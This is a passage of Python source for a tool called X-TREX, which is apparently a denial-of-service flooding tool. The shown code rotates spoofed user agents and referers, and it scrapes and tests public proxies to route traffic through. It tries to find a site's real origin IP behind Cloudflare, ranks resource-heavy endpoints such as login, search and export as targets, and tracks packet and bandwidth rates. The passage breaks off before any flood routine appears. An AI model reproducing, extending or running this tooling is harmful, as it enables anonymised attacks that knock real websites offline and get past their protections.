    "Moziila/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
    "Moziila/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
    "Moziila/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Moziila/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
    "Moziila/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko",
    "Moziila/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
    "Moziila/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)",
    "Moziila/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Moziila/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
    "Moziila/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Moziila/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4",
    "Moziila/5.0 (X11; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Moziila/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
    "Moziila/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Moziila/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0",
    "Moziila/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2",
    "Moziila/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
    "Moziila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Moziila/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Moziila/5.0 (Mobile; rv:32.0) Gecko/32.0 Firefox/32.0",
    "Moziila/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0; McAfee; AmericasCardroom; BRI/2; GWX:DOWNLOADED)",
    "Moziila/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Moziila/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/7.0)",
    "Moziila/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
    "Moziila/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2483.0 Safari/537.36",
    "Moziila/5.0 (Windows NT 5.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Moziila/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; MS-RTC LM 8)",
    "Moziila/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/5.0",
    "Moziila/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466 [FBAN/FBIOS;FBAV/37.0.0.21.273;FBBV/13822349;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.3;FBSS/2; FBCR/fido;FBID/phone;FBLC/fr_FR;FBOP/5]",
    "Moziila/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0 Cyberfox/40.0",
    "Moziila/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mercury/8.7 Mobile/11B554a Safari/9537.53",
    "Moziila/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; GWX:QUALIFIED; MASMJS)",
    "Moziila/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Moziila/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko",
    "Moziila/4.0 (compatible; MSIE 7.0; Windows NT 6.3; ARM; Trident/7.0; Touch; .NET4.0E; .NET4.0C; Tablet PC 2.0)",
    "Moziila/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.19) Gecko/2010062819 Firefox/3.0.19 Flock/2.6.1",
    "Moziila/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Moziila/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
    "Moziila/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Moziila/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
    "Moziila/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Moziila/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
    "Moziila/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",

    # ── Bot / crawler resmi ──
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",

    # ── Mobile / Windows Phone ──
    "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",
    "Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.2.2339 Mobile Safari/537.35+",
    "Millennium/20180102 CFNetwork/893.14.2 Darwin/17.3.0",

    # ── DuckDuckGo custom UA ──
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 DuckDuckGo/7 Safari/605.1.15 [ip:95.247.235.216]",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.4 DuckDuckGo/7 Safari/605.1.15 [ip:85.203.45.31]",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 DuckDuckGo/7 Safari/605.1.15 [ip:46.114.222.100]",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.4 DuckDuckGo/7 Safari/605.1.15 [ip:87.8.201.104]",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML%2C like Gecko) Version/16.1 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 DuckDuckGo/7 Safari/605.1.15 [ip:37.163.125.212]",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 DuckDuckGo/7 Safari/605.1.15 [ip:37.119.239.60]",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML%2C like Gecko) Version/16.3 DuckDuckGo/7 Safari/605.1.15",
]

# Dedupe preserving order
_seen = set()
UA_POOL = [u for u in UA_POOL if not (u in _seen or _seen.add(u))]
del _seen

REFS = ["https://www.google.com/", "https://www.bing.com/",
        "https://duckduckgo.com/", "https://t.co/", "https://www.facebook.com/"]

# ═══════════════════════════════════════════════════════════════════
# PATHS & CONFIG
# ═══════════════════════════════════════════════════════════════════
BASE         = os.path.dirname(os.path.abspath(__file__))
CFG_FILE     = os.path.join(BASE, "xtrex.json")
PROXY_CACHE  = os.path.join(BASE, "xtrex-proxies.txt")
ENDPOINT_FILE= os.path.join(BASE, "xtrex-endpoints.txt")
LOG_DIR      = os.path.join(BASE, "xtrex-logs")

DEFAULTS = {
    "host": "", "port": 80, "tls": False, "path": "/",
    "threads": 50, "duration": 60,
    "use_proxies": True, "use_endpoints": True,
    "stealth": False, "stealth_min_ms": 20, "stealth_max_ms": 200,
    "udp_size": 1200, "payload_mode": "rand",
    "profile": "default",
}
CFG = dict(DEFAULTS)


def _ensure_dirs():
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
    except Exception:
        pass


def load_cfg():
    global CFG
    if not os.path.exists(CFG_FILE):
        return
    try:
        with open(CFG_FILE) as f:
            data = json.load(f)
        active = data.get("active", "default")
        prof = data.get("profiles", {}).get(active, {})
        for k in DEFAULTS:
            if k in prof:
                CFG[k] = prof[k]
        CFG["profile"] = active
    except Exception:
        pass


def save_cfg():
    try:
        _ensure_dirs()
        active = CFG.get("profile", "default")
        profiles = {}
        if os.path.exists(CFG_FILE):
            try:
                with open(CFG_FILE) as f:
                    profiles = json.load(f).get("profiles", {})
            except Exception:
                profiles = {}
        profiles[active] = {k: v for k, v in CFG.items() if k != "profile"}
        with open(CFG_FILE, "w") as f:
            json.dump({"active": active, "profiles": profiles}, f, indent=2)
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════
# UTILS
# ═══════════════════════════════════════════════════════════════════
def rstr(n):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def log_session(line):
    try:
        _ensure_dirs()
        path = os.path.join(LOG_DIR, time.strftime("%Y-%m-%d.log"))
        with open(path, "a") as f:
            f.write(line + "\n")
    except Exception:
        pass


def parse_url(s):
    s = (s or "").strip()
    if not s:
        return "", 80, False, "/"
    if "://" not in s:
        if ":" in s:
            h, p = s.rsplit(":", 1)
            if p.isdigit():
                return h, int(p), int(p) == 443, "/"
        return s, 80, False, "/"
    try:
        p = urlparse(s)
        host = p.hostname or p.netloc
        tls = p.scheme == "https"
        port = p.port or (443 if tls else 80)
        path = p.path or "/"
        if p.query:
            path += "?" + p.query
        return host, port, tls, path
    except Exception:
        return s, 80, False, "/"


def resolve(host):
    if not host:
        return []
    try:
        return list({i[4][0] for i in socket.getaddrinfo(host, None, socket.AF_INET)})
    except Exception:
        try:
            return list({i[4][0] for i in socket.getaddrinfo(host, None, socket.AF_INET6)})
        except Exception:
            return []


def _http_get(url, timeout=15):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": random.choice(UA_POOL)})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception:
        return ""

# ═══════════════════════════════════════════════════════════════════
# PROXY — blacklist + scrape + health check
# ═══════════════════════════════════════════════════════════════════
PROXY_BLACKLIST = set()
PROXY_BL_LOCK = threading.Lock()


def proxy_is_dead(p):
    with PROXY_BL_LOCK:
        return p in PROXY_BLACKLIST


def proxy_mark_dead(p):
    with PROXY_BL_LOCK:
        PROXY_BLACKLIST.add(p)


def proxy_live_pool(proxies):
    return [p for p in proxies if not proxy_is_dead(p)]


def proxy_clear_blacklist():
    with PROXY_BL_LOCK:
        PROXY_BLACKLIST.clear()


PROXY_SOURCES = [
    ("http",   "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"),
    ("http",   "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"),
    ("http",   "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt"),
    ("http",   "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"),
    ("http",   "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"),
    ("http",   "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"),
    ("http",   "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt"),
    ("http",   "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt"),
    ("http",   "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"),
    ("http",   "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt"),
    ("http",   "https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt"),
    ("http",   "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt"),
    ("http",   "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt"),
    ("http",   "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt"),
    ("http",   "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt"),
    ("http",   "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt"),
    ("http",   "https://api.openproxylist.xyz/http.txt"),
    ("http",   "https://api.proxyscrape.com/v2/?request=displayproxies"),
    ("http",   "https://api.proxyscrape.com/?request=displayproxies&proxytype=http"),
    ("http",   "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"),
    ("http",   "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous"),
    ("http",   "http://worm.rip/http.txt"),
    ("http",   "https://proxyspace.pro/http.txt"),
    ("http",   "https://multiproxy.org/txt_all/proxy.txt"),
    ("socks5", "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"),
    ("socks5", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"),
    ("socks5", "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt"),
    ("socks5", "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"),
]


def scrape_proxies(verbose=True):
    seen = set()
    out = []
    for kind, url in PROXY_SOURCES:
        if verbose:
            sys.stdout.write(f"\r  {C.D}scrape {kind}: {url.split('/')[-1][:35]:<35}{C.R}  ")
            sys.stdout.flush()
        text = _http_get(url)
        if not text:
            continue
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "://" in line:
                line = line.split("://", 1)[1]
            if ":" not in line:
                continue
            try:
                h, p = line.rsplit(":", 1)
                p = int(p)
                if not (1 <= p <= 65535):
                    continue
                if not h or len(h) > 100:
                    continue
                key = f"{kind}://{h}:{p}"
                if key in seen:
                    continue
                seen.add(key)
                out.append((kind, h, p))
            except Exception:
                continue
    if verbose:
        print(f"\r  {C.G}»  {len(out)} proxy mentah{C.R}                                        ")
    return out


def check_proxy(proxy, timeout=4):
    """End-to-end test — SOCKS5 greeting + CONNECT ke 1.1.1.1:443."""
    kind, host, port = proxy
    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        if kind == "socks5":
            sock.sendall(b"\x05\x01\x00")
            r = sock.recv(2)
            if r != b"\x05\x00":
                return False
            sock.sendall(b"\x05\x01\x00\x01" + socket.inet_aton("1.1.1.1") + (443).to_bytes(2, "big"))
            r = sock.recv(10)
            if len(r) < 2 or r[1] != 0:
                return False
            return True
        else:
            sock.sendall(b"CONNECT 1.1.1.1:443 HTTP/1.1\r\nHost: 1.1.1.1:443\r\n\r\n")
            r = sock.recv(128)
            if not r:
                return False
            first = r.split(b"\r\n")[0]
            return b"200" in first or b"407" in first
    except Exception:
        return False
    finally:
        if sock:
            try: sock.close()
            except Exception: pass


def check_proxies_parallel(proxies, workers=60, verbose=True):
    if not proxies:
        return []
    alive = []
    total = len(proxies)
    done = 0
    try:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = {ex.submit(check_proxy, p): p for p in proxies}
            for f in as_completed(futs):
                done += 1
                try:
                    if f.result():
                        alive.append(futs[f])
                except Exception:
                    pass
                if verbose and done % 25 == 0:
                    sys.stdout.write(
                        f"\r  {C.D}cek {done}/{total}  hidup {C.G}{len(alive)}{C.R}  "
                    )
                    sys.stdout.flush()
    except Exception:
        pass
    if verbose:
        print(f"\r  {C.G}»  {len(alive)}/{total} proxy hidup{C.R}                                        ")
    return alive


def save_proxies(proxies):
    try:
        with open(PROXY_CACHE, "w") as f:
            f.write(f"# X-TREX proxy cache — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            for kind, h, p in proxies:
                f.write(f"{kind}://{h}:{p}\n")
    except Exception:
        pass


def load_proxies_cached():
    out = []
    if not os.path.exists(PROXY_CACHE):
        return out
    try:
        with open(PROXY_CACHE) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "://" in line:
                    kind, rest = line.split("://", 1)
                    if ":" in rest:
                        h, p = rest.rsplit(":", 1)
                        try:
                            out.append((kind, h, int(p)))
                        except Exception:
                            pass
    except Exception:
        pass
    return out


def get_proxies(force_refresh=False, verbose=True):
    if not force_refresh:
        cached = load_proxies_cached()
        if cached:
            if verbose:
                print(f"  {C.D}cache: {len(cached)} proxy, cek hidup…{C.R}")
            return check_proxies_parallel(cached, verbose=verbose)
    if verbose:
        print(f"  {C.D}scraping sumber proxy publik…{C.R}")
    raw = scrape_proxies(verbose=verbose)
    if not raw:
        return []
    if verbose:
        print(f"  {C.D}tes {len(raw)} proxy (60 thread)…{C.R}")
    alive = check_proxies_parallel(raw, verbose=verbose)
    if alive:
        save_proxies(alive)
    return alive

# ═══════════════════════════════════════════════════════════════════
# ORIGIN FINDER
# ═══════════════════════════════════════════════════════════════════
CF_RANGES = [
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
    "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
    "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
    "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22",
]
CF_NET = []
for _r in CF_RANGES:
    try:
        CF_NET.append(ipaddress.ip_network(_r))
    except Exception:
        pass


def is_cf(ip):
    try:
        a = ipaddress.ip_address(ip)
        return any(a in n for n in CF_NET)
    except Exception:
        return False


def find_origin(domain, verbose=True):
    if verbose:
        sys.stdout.write(f"\r  {C.D}query crt.sh…{C.R}                              ")
        sys.stdout.flush()
    subs = set()
    text = _http_get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=25)
    if text:
        try:
            for entry in json.loads(text):
                for name in entry.get("name_value", "").split("\n"):
                    name = name.strip().lower().lstrip("*.")
                    if name and name.endswith(domain):
                        subs.add(name)
        except Exception:
            pass
    for pfx in ("direct", "origin", "ftp", "mail", "smtp", "vpn",
                "dev", "staging", "stage", "test", "beta", "admin",
                "ssh", "api", "app", "backend", "old", "new", "server"):
        subs.add(f"{pfx}.{domain}")
    subs.add(domain)

    non_cf = {}
    cf = {}
    total = len(subs)
    done = 0
    for sub in subs:
        done += 1
        if verbose and done % 5 == 0:
            sys.stdout.write(
                f"\r  {C.D}resolve {done}/{total}  non-CF: {len(non_cf)}{C.R}          "
            )
            sys.stdout.flush()
        for ip in resolve(sub):
            if is_cf(ip):
                cf[sub] = ip
            else:
                non_cf.setdefault(sub, []).append(ip)
    if verbose:
        print(f"\r  {C.G}»  {len(non_cf)} host non-CF, {len(cf)} via CF{C.R}                    ")
    return non_cf, cf

# ═══════════════════════════════════════════════════════════════════
# ENDPOINT HUNTER
# ═══════════════════════════════════════════════════════════════════
SKOR_KW = {
    "login":10,"signin":10,"auth":10,"oauth":10,"register":9,"signup":9,
    "password":8,"reset":8,"verify":8,"otp":8,"2fa":8,"token":7,
    "search":9,"query":8,"find":7,"filter":7,"lookup":6,
    "export":10,"download":9,"render":9,"generate":9,"pdf":9,"csv":8,
    "zip":8,"image":6,"resize":6,"compress":7,"convert":6,
    "graphql":10,"api":6,"rpc":7,"batch":8,"bulk":8,"upload":8,
    "webhook":7,"checkout":8,"payment":9,"order":7,"cart":6,
    "admin":7,"dashboard":6,"panel":6,"preview":6,"proxy":8,
}
SKOR_NEG = {
    ".css":-3,".js":-3,".png":-3,".jpg":-3,".jpeg":-3,".gif":-3,
    ".svg":-3,".ico":-3,".woff":-3,".woff2":-3,".ttf":-3,".map":-3,
    "/static/":-2,"/assets/":-2,"/cdn-cgi/":-5,"favicon":-3,
}


def skor_path(path, has_query=False):
    s = 0
    p = path.lower()
    for kw, v in SKOR_KW.items():
        if kw in p:
            s += v
    for kw, v in SKOR_NEG.items():
        if kw in p:
            s += v
    if has_query:
        s += 3
    if p in ("/", "", "/index.html", "/index.php"):
        s -= 3
    if len(path) > 60:
        s += 2
    return s


RE_HREF   = re.compile(r'href=["\']([^"\']+)["\']', re.I)
RE_ACTION = re.compile(r'action=["\']([^"\']+)["\']', re.I)
RE_SRC    = re.compile(r'src=["\']([^"\']+)["\']', re.I)
RE_FETCH  = re.compile(r'fetch\(["\']([^"\']+)["\']', re.I)
RE_AXIOS  = re.compile(r'axios\.\w+\(["\']([^"\']+)["\']', re.I)
RE_APIP   = re.compile(r'["\'](/api/[^"\']+|/v\d+/[^"\']+)["\']', re.I)
RE_SMLOC  = re.compile(r'<loc>([^<]+)</loc>', re.I)


def _fetch_hunt(url, timeout=6):
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": random.choice(UA_POOL),
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        })
        ctx = ssl._create_unverified_context()
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.read(2_000_000).decode("utf-8", "ignore"), r.status
    except Exception:
        return "", 0


def _fetch_hunt_slow(url, timeout=6, delay=0.05):
    time.sleep(delay + random.uniform(0, 0.05))
    return _fetch_hunt(url, timeout=timeout)


def hunt_endpoints(host, tls, verbose=True, max_pages=25):
    base = f"{'https' if tls else 'http'}://{host}"
    skor_map = {}
    seen = set()
    queue = deque([base + "/"])

    if verbose:
        sys.stdout.write(f"\r  {C.D}ambil sitemap + robots…{C.R}                    ")
        sys.stdout.flush()

    for sm in ("/sitemap.xml", "/sitemap_index.xml", "/robots.txt"):
        body, st = _fetch_hunt_slow(base + sm)
        if st == 200 and body:
            if sm.endswith(".xml"):
                for loc in RE_SMLOC.findall(body):
                    queue.append(loc.strip())
            else:
                for line in body.splitlines():
                    if line.lower().startswith("sitemap:"):
                        sb, sst = _fetch_hunt_slow(line.split(":", 1)[1].strip())
                        if sst == 200:
                            for loc in RE_SMLOC.findall(sb):
                                queue.append(loc.strip())

    if verbose:
        sys.stdout.write(f"\r  {C.D}crawl {max_pages} halaman…{C.R}                    ")
        sys.stdout.flush()

    visited = 0
    while queue and visited < max_pages:
        url = queue.popleft()
        if url in seen:
            continue
        seen.add(url)
        visited += 1
        body, st = _fetch_hunt_slow(url)
        if not body or st >= 400:
            continue
        urls = set()
        for rx in (RE_HREF, RE_ACTION, RE_SRC, RE_FETCH, RE_AXIOS, RE_APIP):
            for m in rx.findall(body):
                try:
                    urls.add(urljoin(url, m.strip()))
                except Exception:
                    pass
        for u in urls:
            if u not in seen and len(seen) < 1500:
                queue.append(u)
        p = urlparse(url)
        if p.netloc == host:
            path = p.path + ("?" + p.query if p.query else "")
            sc = skor_path(p.path, bool(p.query))
            if sc > 0:
                skor_map[path] = max(skor_map.get(path, 0), sc)

    probes = ["/api", "/api/v1", "/graphql", "/api/graphql",
              "/api/login", "/api/search", "/api/users", "/search",
              "/login", "/register", "/download", "/export", "/admin"]
    for pth in probes:
        body, st = _fetch_hunt_slow(base + pth, timeout=3)
        if st and st != 404:
            sc = skor_path(pth) + 3
            skor_map[pth] = max(skor_map.get(pth, 0), sc)

    hasil = sorted(skor_map.items(), key=lambda x: x[1], reverse=True)
    if verbose:
        print(f"\r  {C.G}»  {len(hasil)} endpoint diskor{C.R}                    ")
    return hasil


def save_endpoints(host, hasil):
    try:
        with open(ENDPOINT_FILE, "w") as f:
            f.write(f"# X-TREX endpoints — {host} — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            for p, sc in hasil:
                f.write(f"{sc}|{p}\n")
    except Exception:
        pass


def load_endpoints(top=10):
    out = []
    if not os.path.exists(ENDPOINT_FILE):
        return out
    try:
        with open(ENDPOINT_FILE) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "|" in line:
                    _, p = line.split("|", 1)
                    out.append(p.strip())
                else:
                    out.append(line)
    except Exception:
        return []
    return out[:top] if top else out

# ═══════════════════════════════════════════════════════════════════
# STATS
# ═══════════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.pkts = self.bytes = self.ok = self.fail = 0
        self.errors = deque(maxlen=8)
        self.stop = threading.Event()
        self.th = None

    def reset(self):
        with self.lock:
            self.pkts = self.bytes = self.ok = self.fail = 0
            self.errors.clear()

    def bump(self, n, ok=True, e=None):
        with self.lock:
            self.pkts += 1
            self.bytes += n
            if ok:
                self.ok += 1
            else:
                self.fail += 1
                if e is not None:
                    s = f"{type(e).__name__}: {e}"
                    if s not in self.errors:
                        self.errors.append(s)

    def snap(self):
        with self.lock:
            return {"p": self.pkts, "b": self.bytes,
                    "o": self.ok, "f": self.fail, "e": list(self.errors)}

    def start_print(self):
        self.stop.clear()
        def loop():
            lp = lb = 0
            lt = time.time()
            while not self.stop.is_set():
                time.sleep(1)
                now = time.time()
                s = self.snap()
                pps = s["p"] - lp
                bps = (s["b"] - lb) * 8 / max(now - lt, 0.001)
                tot = s["o"] + s["f"]
                rasio = (s["o"] / max(tot, 1)) * 100
                sys.stdout.write(
                    f"\r\x1b[K  {C.Cy}▶{C.R} {pps:>6} pkt/s  {bps/1e6:>6.2f} Mbps  "
                    f"total {s['p']:>9}  ok {C.G}{s['o']}{C.R}  "
                    f"fail {C.Rd}{s['f']}{C.R}  rasio {C.Y}{rasio:>5.1f}%{C.R}  "
                )
                sys.stdout.flush()
                lp, lb, lt = s["p"], s["b"], now
        self.th = threading.Thread(target=loop, daemon=True)
        self.th.start()

    def stop_print(self):
        self.stop.set()
        if self.th:
            self.th.join(timeout=2)
        print()

# ═══════════════════════════════════════════════════════════════════
# CONTEXT
# ═══════════════════════════════════════════════════════════════════
class Ctx:
    def __init__(self, cfg, ips, proxies, endpoints, stats, stop):
        self.cfg = cfg
        self.ips = ips
        self.proxies = proxies
        self.endpoints = endpoints
        self.stats = stats
        self.stop = stop

    def jitter(self):
        if not self.cfg.get("stealth"):
            return
        lo = self.cfg.get("stealth_min_ms", 20) / 1000.0
        hi = self.cfg.get("stealth_max_ms", 200) / 1000.0
        try:
            time.sleep(random.uniform(lo, hi))
        except Exception:
            pass

    def pick_path(self):
        if self.endpoints:
            return random.choice(self.endpoints)
        return self.cfg["path"]

# ═══════════════════════════════════════════════════════════════════
# NETWORK
# ═══════════════════════════════════════════════════════════════════
def direct_connect(ip, port, tls, host, timeout=6):
    sock = socket.create_connection((ip, port), timeout=timeout)
    if tls:
        ctx = ssl._create_unverified_context()
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def via_proxy(proxy, host, port, tls, timeout=8, alpn=None):
    kind, ph, pp = proxy
    sock = socket.create_connection((ph, pp), timeout=timeout)
    sock.settimeout(timeout)
    if kind == "http":
        sock.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
        resp = sock.recv(1024)
        if not resp or b"200" not in resp.split(b"\r\n")[0]:
            sock.close()
            raise ConnectionError("http proxy refused")
        if tls:
            ctx = ssl._create_unverified_context()
            if alpn:
                try: ctx.set_alpn_protocols(alpn)
                except Exception: pass
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock
    if kind == "socks5":
        sock.sendall(b"\x05\x01\x00")
        greeting = sock.recv(2)
        if greeting == b"\x05\x02":
            sock.close()
            raise ConnectionError("socks5 requires auth")
        if greeting != b"\x05\x00":
            sock.close()
            raise ConnectionError("socks5 bad greeting")
        hb = host.encode()
        sock.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + port.to_bytes(2, "big"))
        resp = sock.recv(10)
        if len(resp) < 2 or resp[1] != 0:
            sock.close()
